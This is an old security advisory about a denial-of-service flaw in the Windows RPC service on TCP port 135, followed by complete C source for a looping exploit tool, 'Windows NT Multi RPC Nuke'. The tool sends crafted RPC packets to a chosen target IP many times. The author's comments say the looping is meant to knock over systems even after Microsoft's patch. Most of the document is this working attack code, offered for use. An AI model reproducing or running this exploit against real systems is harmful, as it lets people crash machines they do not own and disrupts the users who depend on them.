source: http://www.securityfocus.com/bid/6005/info
 
The Microsoft Windows RPC service contains a flaw that may allow a remote attacker to cause a denial of service. By sending a specifically malformed packet to TCP port 135, the RPC service will be disabled.
 
This vulnerability was originally reported to only affect Windows 2000. Microsoft has confirmed that Windows NT 4.0 and XP are also vulnerable.
 
It has been reported that installation of the provided patch will cause some problems in IIS environments. Specifically, users who are using COM+ in IIS environments may experience problems with ASP transactions.
 
A variant of this issue has been reported which allegedly affects patched systems. It is apparently possible to trigger this variant by flooding a system with malformed packets. 

/*
* Microsoft Windows NT RPC Service Denial of Service Vulnerability
*
* Orginal Code By Lion @ http://www.cnhonker.com
* Upgraded By Trancer @ http://BinaryVision.tech.nu
*
* I have notice that even after a Windows NT system is patched aginst this
vulnerability with an offical M$ update,
* an attacker can still DoS that system if he activate this exploit a lot
of times, fast.
* So I've upgraded the exploit by looping it and letting you control the
times you want to nuke a system
* (with a patched 2000\XP 250-400 times is recommended).
*
* That's it. enjoy :-)
\*

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char sendcode1[] =
  "\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x02\x00\x00\x00"
  "\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
  "\x60\x9e\xe7\xb9\x52\x3d\xce\x11\xaa\xa1\x00\x00\x69\x01\x29\x3f"
  "\x02\x00\x02\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
  "\x2b\x10\x48\x60\x02\x00\x00\x00\x05\x00\x00\x01\x10\x00\x00\x00"
  "\xd0\x16\x00\x00\x8f\x00\x00\x00\x20\x27\x01\x00\x00\x00\x02\x00"
  "\xf0\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00";

char sendcode2[] =
  "\x88\x13\x00\x00\x00\x00\x00\x00\x88\x13\x00\x00";

char sendcode3[] =
  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00";

char sendcode4[] =
  "\xfe\xff\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x3d\x3d\x3d\x3d"
  "\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x50\x10\x01\x00\x00\x00\x02\x00";

char sendcode5[] =
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\x80\xf9\x00\x00\x00\x00\x02\x00";

char sendcode6[] =
  "\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
  "\xb0\xe2\x00\x00\x00\x00\x02\x00";

char sendcode7[] =
  "\x05\x00\x00\x02\x10\x00\x00\x00\x60\x15\x00\x00\x8f\x00\x00\x00"
  "\x60\x15\x00\x00\x00\x00\x02\x00";

char sendcode8[] =
  "\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00";

int main(int argc, char *argv[])
{
  WSADATA wsaData;
  WORD wVersionRequested;
  struct hostent *pTarget;
  struct sockaddr_in sock;
  char *targetip;
  int port,bufsize,times,i;
  SOCKET s;
  char buffer[20480];

  printf("======================= Windows NT Multi RPC Nuke V0.12
======================\r\n");
  printf("=============== Orginal Code By Lion @ http://www.cnhonker.com
===============\r\n");
  printf("============= Upgraded By Trancer @ http://BinaryVision.tech.nu
==============\r\n\n");

  if (argc < 2)
  {
    printf("Usage:\r\n");
    printf(" %s <TargetIP> <TargetPort> <BufferSize> <Times>\r\n", argv[0]);
    printf("Exaple: %s 198.167.0.1 135 512 250\r\n", argv[0]);
    printf("PS:\r\n");
    printf(" If target is XP, try 2 times.\r\n");
    exit(1);
  }

  wVersionRequested = MAKEWORD(1, 1);
  if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

  targetip = argv[1];
  port = 135;
  if (argc >= 3) port = atoi(argv[2]);
  bufsize = 512;
  if (argc >= 4) bufsize = atoi(argv[3]);
  times = 1;
  if (argc >= 5) times = atoi(argv[4]);

  for (i = 0; i < times; i = i + 1)
  {

    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s==INVALID_SOCKET)
    {
      printf("Socket error!\r\n");
      exit(1);
    }

    printf("Resolving Hostnames...\n");
    if ((pTarget = gethostbyname(targetip)) == NULL)
    {
      printf("Resolve of %s failed, please try again.\n", argv[1]);
      exit(1);
    }

    memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
    sock.sin_family = AF_INET;
    sock.sin_port = htons((USHORT)port);

    printf("Connecting...\n");
    if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
    {
      printf("Couldn't connect to host.\n");
      exit(1);
    }

    printf("Connected!...\n");
    printf("Sending Packets...\n");
    if (send(s, sendcode1, sizeof(sendcode1)-1, 0) == -1)
    {
      printf("Error sending nuke Packets\r\n");
      closesocket(s);
      exit(1);
    }

    memset(&buffer, '\x41', 240);
    send(s, buffer, 240, 0);

    send(s, sendcode2, sizeof(sendcode2)-1, 0);
    memset(&buffer, '\x42', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode3, sizeof(sendcode3)-1, 0);
    memset(&buffer, '\x43', 512);
    send(s, buffer, 512, 0);

    send(s, sendcode4, sizeof(sendcode4)-1, 0);
    memset(&buffer, '\x44', 20480);
    send(s, buffer, 20480, 0);

    memset(&buffer, '\x44', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode5, sizeof(sendcode5)-1, 0);
    memset(&buffer, '\x45', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode6, sizeof(sendcode6)-1, 0);
    memset(&buffer, '\x46', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode7, sizeof(sendcode7)-1, 0);
    memset(&buffer, '\x47', 5000);
    send(s, buffer, 5000, 0);

    send(s, sendcode8, sizeof(sendcode8)-1, 0);
    memset(&buffer, '\x48', 5000);
    send(s, buffer, 5000, 0);
    i = i + 1;
  }

  if (times < 2)
  {
    printf("Nuked! If target is XP, try a again! :)\r\n");
  }
  else
  {
    printf("%s was nuked %s times\r\n", argv[1], argv[4]);
  }

  closesocket(s);
  WSACleanup();
  return 0;
}